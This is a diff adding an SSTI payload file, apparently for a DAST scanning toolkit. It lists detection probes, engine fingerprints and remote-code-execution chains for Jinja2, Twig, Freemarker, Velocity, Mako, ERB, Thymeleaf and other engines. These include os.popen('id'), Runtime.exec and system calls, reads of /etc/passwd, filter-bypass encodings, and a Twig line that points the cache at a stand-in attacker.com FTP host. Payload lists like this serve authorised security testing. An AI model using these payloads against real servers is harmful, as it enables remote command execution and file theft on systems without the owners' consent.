@@ -1,0 +1,226 @@
+# =============================================================================
+# SSTI (Server-Side Template Injection) Payloads
+# justdastit DAST toolkit
+# =============================================================================
+# Categories: Detection probes, engine fingerprinting, RCE chains
+# Engines: Jinja2, Twig, Freemarker, Velocity, Pebble, Mako, ERB,
+#          Handlebars, Smarty, Thymeleaf, Razor
+# =============================================================================
+
+# -----------------------------------------------------------------------------
+# DETECTION PROBES — Universal math/string operations
+# -----------------------------------------------------------------------------
+{{7*7}}
+${7*7}
+#{7*7}
+<%= 7*7 %>
+{{7*'7'}}
+${7*'7'}
+{7*7}
+{{7+7}}
+${7+7}
+#{7+7}
+a]b
+${foobar}
+{{foobar}}
+#{foobar}
+<%= foobar %>
+{foobar}
+{{dump(app)}}
+${T(java.lang.Math).random()}
+{{config}}
+{{self}}
+{{request}}
+{{settings.SECRET_KEY}}
+${{7*7}}
+*{7*7}
+@(1+1)
+#{3*3}
+[= 7*7 ]
+{{= 7*7}}
+#set($x=7*7)${x}
+
+# -----------------------------------------------------------------------------
+# ENGINE FINGERPRINTING — Identify which template engine is running
+# -----------------------------------------------------------------------------
+# Jinja2 fingerprint
+{{''.__class__.__mro__}}
+{{[].__class__.__base__.__subclasses__()}}
+{{request.application.__self__._get_data_for_json.__globals__}}
+{% for x in range(10) %}{{x}}{% endfor %}
+
+# Twig fingerprint
+{{_self.env.getFilter}}
+{{app.request.server.all|join(',')}}
+{% set foo = 'bar' %}{{foo}}
+{{'/etc/passwd'|file_excerpt(1,30)}}
+
+# Freemarker fingerprint
+${.now}
+${.version}
+<#assign x=7*7>${x}
+${product.class.protectionDomain}
+
+# Velocity fingerprint
+#set($x=7*7)$x
+$class.inspect("java.lang.Runtime")
+#set($str=$class.inspect("java.lang.String").type)
+$customer.getClass().forName("java.lang.Runtime")
+
+# Pebble fingerprint
+{% set cmd = 'id' %}
+{{ variable.getClass().forName('java.lang.Runtime') }}
+
+# Mako fingerprint
+${self.module.cache.util.os.popen("id").read()}
+<%! import os %>
+
+# ERB fingerprint
+<%= 7*7 %>
+<%= self %>
+<%= Dir.entries('/') %>
+
+# Handlebars fingerprint
+{{this}}
+{{#each this}}{{@key}}={{this}}{{/each}}
+{{#with "s" as |string|}}{{#with "e"}}{{#with split as |conslist|}}{{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}{{#with string.split as |codelist|}}{{this.pop}}{{this.push "return require('child_process').exec('id');"}}{{this.pop}}{{#each conslist}}{{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}{{/each}}{{/with}}{{/with}}{{/with}}{{/with}}
+
+# Smarty fingerprint
+{$smarty.version}
+{php}echo 'test';{/php}
+{system('id')}
+
+# Thymeleaf fingerprint
+__${7*7}__
+__${T(java.lang.Runtime).getRuntime()}__
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}
+
+# Razor fingerprint
+@(1+1)
+@{var x = 1+1;}@x
+@Html.Raw("<script>alert(1)</script>")
+
+# -----------------------------------------------------------------------------
+# JINJA2 RCE CHAINS
+# -----------------------------------------------------------------------------
+{{''.__class__.__mro__[2].__subclasses__()}}
+{{''.__class__.__mro__[1].__subclasses__()}}
+{{''.__class__.__base__.__subclasses__()}}
+{{''.__class__.__mro__[2].__subclasses__()[40]('/etc/passwd').read()}}
+{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
+{{request.application.__self__._get_data_for_json.__globals__['__builtins__']['__import__']('os').popen('id').read()}}
+{{cycler.__init__.__globals__.os.popen('id').read()}}
+{{joiner.__init__.__globals__.os.popen('id').read()}}
+{{namespace.__init__.__globals__.os.popen('id').read()}}
+{{lipsum.__globals__["os"].popen('id').read()}}
+{{lipsum.__globals__.os.popen('id').read()}}
+{{get_flashed_messages.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{url_for.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{''.__class__.__mro__[1].__subclasses__()[396]('id',shell=True,stdout=-1).communicate()[0].strip()}}
+{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('id').read()")}}{% endif %}{% endfor %}
+{{request.__class__._load_form_data.__globals__.__builtins__.__import__("os").popen("id").read()}}
+{{g.pop.__globals__.__builtins__.__import__('os').popen('id').read()}}
+{{''['__class__']['__mro__'][1]['__subclasses__']()}}
+{{'foo'.__class__.__base__.__subclasses__()}}
+
+# Jinja2 filter bypass
+{{request|attr('application')|attr('\x5f\x5fself\x5f\x5f')}}
+{{''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')()}}
+{%set a='__cla'+'ss__'%}{{''|attr(a)}}
+
+# Jinja2 sandbox escapes
+{{().__class__.__bases__[0].__subclasses__()}}
+{{dict.__base__.__subclasses__()}}
+{{[].__class__.__base__.__subclasses__()[0].__subclasses__()[0].__subclasses__()[0].__subclasses__()[0]}}
+
+# -----------------------------------------------------------------------------
+# TWIG RCE CHAINS
+# -----------------------------------------------------------------------------
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+{{['id']|filter('system')}}
+{{['id']|filter('passthru')}}
+{{['cat /etc/passwd']|filter('system')}}
+{{app.request.query.filter(0,'id','',{'options':'system'})}}
+{{_self.env.setCache("ftp://attacker.com:8080")}}
+{{[0]|reduce('system','id')}}
+
+# -----------------------------------------------------------------------------
+# FREEMARKER RCE CHAINS
+# -----------------------------------------------------------------------------
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("id")}
+${"freemarker.template.utility.Execute"?new()("id")}
+<#assign classloader=article.class.protectionDomain.classLoader>
+<#assign ex="freemarker.template.utility.Execute"?new()>${ex("cat /etc/passwd")}
+[#assign ex="freemarker.template.utility.Execute"?new()]${ex("id")}
+[=7*7]
+<#assign ob="freemarker.template.utility.ObjectConstructor"?new()>${ob("java.lang.ProcessBuilder",["id"]).start()}
+
+# -----------------------------------------------------------------------------
+# VELOCITY RCE CHAINS
+# -----------------------------------------------------------------------------
+#set($e="e")$e.getClass().forName("java.lang.Runtime").getMethod("getRuntime",null).invoke(null,null).exec("id")
+#set($x='')#set($rt=$x.class.forName('java.lang.Runtime'))#set($chr=$x.class.forName('java.lang.Character'))#set($str=$x.class.forName('java.lang.String'))#set($ex=$rt.getRuntime().exec('id'))$ex.waitFor()#set($out=$ex.getInputStream())#foreach($i in [1..$out.available()])$str.valueOf($chr.toChars($out.read()))#end
+
+# -----------------------------------------------------------------------------
+# PEBBLE RCE CHAINS
+# -----------------------------------------------------------------------------
+{% set cmd = 'id' %}{% set bytes = (1).TYPE.forName('java.lang.Runtime').methods[6].invoke(null,null).exec(cmd).inputStream.readAllBytes() %}{{ (1).TYPE.forName('java.lang.String').constructors[0].newInstance(bytes, 0, bytes.length) }}
+
+# -----------------------------------------------------------------------------
+# MAKO RCE CHAINS
+# -----------------------------------------------------------------------------
+<%import os%>${os.popen("id").read()}
+<%import subprocess%>${subprocess.check_output("id",shell=True)}
+${self.module.cache.util.os.popen("id").read()}
+${self.template.module.__loader__.get_source()[0]}
+<%! import os %>${os.popen('id').read()}
+
+# -----------------------------------------------------------------------------
+# ERB RCE CHAINS
+# -----------------------------------------------------------------------------
+<%= system("id") %>
+<%= `id` %>
+<%= IO.popen("id").readlines() %>
+<%= File.read('/etc/passwd') %>
+<%= Dir.glob('/*') %>
+<%= `cat /etc/passwd` %>
+
+# -----------------------------------------------------------------------------
+# SMARTY RCE CHAINS
+# -----------------------------------------------------------------------------
+{system('id')}
+{passthru('id')}
+{`id`}
+{if phpinfo()}{/if}
+{if system('id')}{/if}
+
+# -----------------------------------------------------------------------------
+# THYMELEAF RCE CHAINS
+# -----------------------------------------------------------------------------
+__${new java.util.Scanner(T(java.lang.Runtime).getRuntime().exec("id").getInputStream()).next()}__::.x
+__${T(java.lang.Runtime).getRuntime().exec("id")}__::.x
+${T(java.lang.Runtime).getRuntime().exec('id')}
+${#rt = @java.lang.Runtime@getRuntime(),#rt.exec('id')}
+*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec('id').getInputStream())}
+${T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(105).concat(T(java.lang.Character).toString(100))).getInputStream())}
+
+# -----------------------------------------------------------------------------
+# RAZOR RCE CHAINS
+# -----------------------------------------------------------------------------
+@System.IO.File.ReadAllText("/etc/passwd")
+@System.IO.File.ReadAllText("C:\\windows\\win.ini")
+
+# -----------------------------------------------------------------------------
+# WAF / FILTER BYPASS VARIANTS
+# -----------------------------------------------------------------------------
+{{''['\x5f\x5fclass\x5f\x5f']}}
+{{''['\u005f\u005fclass\u005f\u005f']}}
+{{'foo'|attr('\x5f\x5fclass\x5f\x5f')}}
+{{''.__getattribute__('__cl'+'ass__')}}
+{{''['__cla'+'ss__']}}
+{{''['__cla''ss__']}}
+{{()|attr('\x5f\x5fclass\x5f\x5f')}}
+{{config['__cl'+'ass__']}}
+{{''|attr('_'+'_class_'+'_')}}
+{{request['__cl'+'ass__']}}
+{{''.__class__.__mro__.__getitem__(2)}}
